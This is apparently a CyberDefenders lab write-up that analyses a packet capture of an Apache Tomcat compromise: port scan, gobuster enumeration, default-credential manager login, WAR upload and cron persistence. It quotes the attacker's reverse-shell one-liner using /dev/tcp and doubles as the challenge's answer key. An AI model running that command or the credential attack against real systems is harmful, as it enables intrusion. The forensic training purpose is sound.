---
title: CyberDefenders - Tomcat Takeover
date: 2026-06-07 00:00:00 +0800
categories:
  - CyberDefenders
  - Network Forensics
tags:
  - WireShark
  - PortScan
difficulty: Easy
pin: false
---

---

**Scenario:** The SOC team has identified suspicious activity on a web server within the company's intranet. To better understand the situation, they have captured network traffic for analysis. The PCAP file may contain evidence of malicious activities that led to the compromise of the Apache Tomcat web server. Your task is to analyze the PCAP file to understand the scope of the attack.

## Questions

> Q1: Given the suspicious activity detected on the web server, the PCAP file reveals a series of requests across various ports, indicating potential scanning behavior. Can you identify the source IP address responsible for initiating these requests on our server?

![](assets/cyberdef/Pasted%20image%2020260607140240.png)
 
![](assets/cyberdef/Pasted%20image%2020260607141541.png)

![](assets/cyberdef/Pasted%20image%2020260607141041.png)

The IP address `14.0.0.120` has generated high volume of packets  toward the internal IP address `10.0.0.112`. Next, we analyzed the activities associated with this IP, and observed a large amount of port scanning activities. For example, when the server responded with a **(RST, ACK)** it indicated that the port was closed. However, port such as 22 the server responded with a  **(SYN,ACK)** and followed by a **(RST)** packet from the attacker. This behavior indicates that the port was open, as the attacker terminated the connection after confirming the port's status.

>✅ **Answer: 14.0.0.120**

---

> Q2: Based on the identified IP address associated with the attacker, can you identify the country from which the attacker's activities originated?

![](assets/cyberdef/Pasted%20image%2020260607142007.png)

>✅ **Answer: China**

---

> Q3: From the PCAP file, multiple open ports were detected as a result of the attacker's active scan. Which of these ports provides access to the web server admin panel?

![](assets/cyberdef/Pasted%20image%2020260607142621.png)

![](assets/cyberdef/Pasted%20image%2020260607143232.png)

Filter `tcp.flags == 0x0004` RST is enabled, to search opened ports. Port `22`,`8080`,`8009` and `35790` were opened. We can exclude port `22`because it is SSH. Next, we analyze the activities associated with these ports `tcp.port==<port>`. Port `8080` revealed that it is running Apache Tomcat web server.

>✅ **Answer: 8080**

---

> Q4: Following the discovery of open ports on our server, it appears that the attacker attempted to enumerate and uncover directories and files on our web server. Which tools can you identify from the analysis that assisted the attacker in this enumeration process?

![](assets/cyberdef/Pasted%20image%2020260607143428.png)

We can identified the attacker used gobuster to enumerate the directories and files of the web server. It can be found in the HTTP stream.

>✅ **Answer: gobuster**

---

> Q5: After the effort to enumerate directories on our web server, the attacker made numerous requests to identify administrative interfaces. Which specific directory related to the admin panel did the attacker uncover?

![](assets/cyberdef/Pasted%20image%2020260607143731.png)

The attacker found the `manager`directory which required authentication.

>✅ **Answer: manager**

---

> Q6: After accessing the admin panel, the attacker tried to brute-force the login credentials. Can you determine the correct username and password that the attacker successfully used for login?

![](assets/cyberdef/Pasted%20image%2020260607145444.png)

Filter `http.authorization` and look for packet before the attacker move the next path of `/manager`. The attacker used `admin:tomcat`to login to the web sever.

>✅ **Answer: admin:tomcat**

---

> Q7: Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data?

![](assets/cyberdef/Pasted%20image%2020260607144505.png)

This Tomcat webserver is vulnerable to Tomcat File Upload RCE vulnerability which allowed attacker to gain RCE.

>✅ **Answer: JXQOZY.war**

---

> Q8: After successfully establishing a reverse shell on our server, the attacker aimed to ensure persistence on the compromised machine. From the analysis, can you determine the specific command they are scheduled to run to maintain their presence?

![](assets/cyberdef/Pasted%20image%2020260607150126.png)

![](assets/cyberdef/Pasted%20image%2020260607150235.png)

Follow the TCP stream after the attacker executed the RCE file, the attacker configured a cron job to connect to `14.0.0.120:443` every minute.

>✅ **Answer:  /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'**

